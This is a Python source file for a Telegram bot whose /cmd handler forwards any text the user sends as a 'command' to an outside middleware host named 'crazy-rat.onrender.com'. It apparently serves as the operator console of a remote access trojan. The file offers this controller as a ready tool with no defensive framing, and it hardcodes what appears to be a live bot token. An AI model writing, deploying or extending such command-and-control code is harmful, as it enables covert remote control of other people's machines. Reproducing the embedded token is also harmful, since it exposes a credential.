from telegram.ext import Application, CommandHandler, ContextTypes
import requests

# Telegram bot token
TELEGRAM_BOT_TOKEN = "7557926778:AAH74UZc7JB5KSa0tJWRjqlBDlFDeEruog8"

# Middleware URL
MIDDLEWARE_URL = "https://crazy-rat.onrender.com"  # Replace with your actual middleware URL

# Command to start the bot
async def start(update, context):
    await update.message.reply_text("🤖 Bot is up and running! Send /cmd <command> to interact.")

# Command to send instructions to the middleware
async def send_command(update, context):
    command = ' '.join(context.args)
    if command:
        try:
            response = requests.post(f"{MIDDLEWARE_URL}/command", json={"command": command})
            await update.message.reply_text(f"Command sent successfully: {response.text}")
        except Exception as e:
            await update.message.reply_text(f"Failed to send command: {e}")
    else:
        await update.message.reply_text("❗ Please provide a command after /cmd.")

# Function to start the bot
def start_bot():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("cmd", send_command))
    application.run_polling()
